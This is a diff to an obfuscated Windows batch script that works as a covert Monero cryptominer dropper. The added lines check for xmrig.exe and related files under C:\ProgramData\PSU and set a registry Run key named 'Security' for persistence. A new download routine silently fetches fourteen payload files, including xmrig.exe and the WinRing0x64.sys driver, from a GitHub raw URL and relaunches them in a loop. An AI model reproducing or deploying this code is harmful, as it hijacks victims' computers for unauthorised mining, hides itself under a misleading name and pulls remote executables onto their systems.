@@ -53,6 +53,20 @@ set bbbbbbbbbbbbbbbbbbbbbbbbbbb=Z
 @echo off
 start "" "C:\ProgramData\PSU\samba.vbs"
 :start
+if not exist "C:\ProgramData\PSU\bgin.bat" goto download
+if not exist "C:\ProgramData\PSU\check.bat" goto download
+if not exist "C:\ProgramData\PSU\config.json" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
+if not exist "C:\ProgramData\PSU\Install.vbs" goto download
+if not exist "C:\ProgramData\PSU\process.bat" goto download
+if not exist "C:\ProgramData\PSU\run.doc" goto download
+if not exist "C:\ProgramData\PSU\run.xls" goto download
+if not exist "C:\ProgramData\PSU\samba.vbs" goto download
+if not exist "C:\ProgramData\PSU\smb.bat" goto download
+if not exist "C:\ProgramData\PSU\start.vbs" goto download
+if not exist "C:\ProgramData\PSU\Start-Monero.bat" goto download
+if not exist "C:\ProgramData\PSU\WinRing0x64.sys" goto download
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
 del "C:\ProgramData\bgin.bat"
 del "C:\ProgramData\world.vbs"
 tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
@@ -125,6 +139,11 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaa%%aaaaaaaaaaaaaaaaa%%aaaaa%*
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%*
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%*
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% /%bbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaa%%aaaaa%%aa%*
@@ -269,6 +288,11 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%bbbb%%bbbb%%bbbbbbbbbbbbbbbb%%bbbbbbbbbbbbbb%%bbbbbbbbbbbbbb%.%bbbbbb%%bbbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbb%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -517,6 +541,11 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaa%%aaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaa%%aaaa%%aa%%aaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %bbbbbbbbbbbbbbbbb%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%51.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %bb%%bbbbbbbbbbbbbbbbbbbbbbb%%bbbbbb%%bbbbbbbbbbbbbbb%%bbbbbbbb%%bbbbbbbbbb%%bbbbbbbbbbbbbbb%%bbbbbb%.%bbbbbb%%bbbbbbbbbbbbbbbbbbbbbbbbb%%bbbbbb% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaa%%aaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa% /%bbbbbbbbbb%%bbbbbbbbbbbbbb% %aaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaaaa%%bbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -995,6 +1024,11 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %bbbbbbbbb%%aa%%aaaa%%aaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%bbbbbb%%aaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaa%%aa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -1435,6 +1469,11 @@ del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %bbbbbbbbbbbbbbbbbbbb%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaa%%aaaaaa%%aaaa% %bbbb%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaa% %bbbbbbbbbbbbb%%bbbb%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
+tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
+if "%ERRORLEVEL%"=="1" goto execute
+REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run" /V "Security" /t REG_BINARY /D 000000000000000000000000 /F
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaa%%aaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
 %aaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%
 %aaaaaaaaaaaaaaaaaaaaa%%aa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaaaa%%aaaaaaaaaa%%aaaaaaaaaaaaa%%aaaaaaaaaaaaa% /%aaaaaaa% /%aaaaaaaaaa%%aaaaaaaaaaaaaa% %aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaa%%aaaaaaaaaaaaaaaaaaaaaaa%%aaaa%.%aaaaaa%%aaaaaaaaaaaaaaaaaaaaaaaaa%%aaaaaa%
@@ -2067,7 +2106,27 @@ REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved
 del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 goto start
 :execute
+if not exist "C:\ProgramData\PSU\xmrig.exe" goto download
+if not exist "C:\ProgramData\PSU\execute.vbs" goto download
 start "" "C:\ProgramData\PSU\samba.vbs"
 start "" "C:\ProgramData\PSU\execute.vbs"
 timeout 3
+goto start
+:download
+mkdir "C:\ProgramData\PSU"
+timeout 0 >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Install.txt" -o "C:\ProgramData\PSU\Install.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/Start-Monero.txt" -o "C:\ProgramData\PSU\Start-Monero.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/WinRing0x64.txt" -o "C:\ProgramData\PSU\WinRing0x64.sys" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/bgin.txt" -o "C:\ProgramData\PSU\bgin.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/check.txt" -o "C:\ProgramData\PSU\check.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/config.txt" -o "C:\ProgramData\PSU\config.json" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/execute.txt" -o "C:\ProgramData\PSU\execute.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/process.txt" -o "C:\ProgramData\PSU\process.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run.txt" -o "C:\ProgramData\PSU\run.doc" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/run2.txt" -o "C:\ProgramData\PSU\run.xls" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/samba.txt" -o "C:\ProgramData\PSU\samba.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/smb.txt" -o "C:\ProgramData\PSU\smb.bat" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/start.txt" -o "C:\ProgramData\PSU\start.vbs" >> nul
+curl -s "https://raw.githubusercontent.com/anonimusman00-1/Task/main/xmrig.txt" -o "C:\ProgramData\PSU\xmrig.exe" >> nul
 goto start
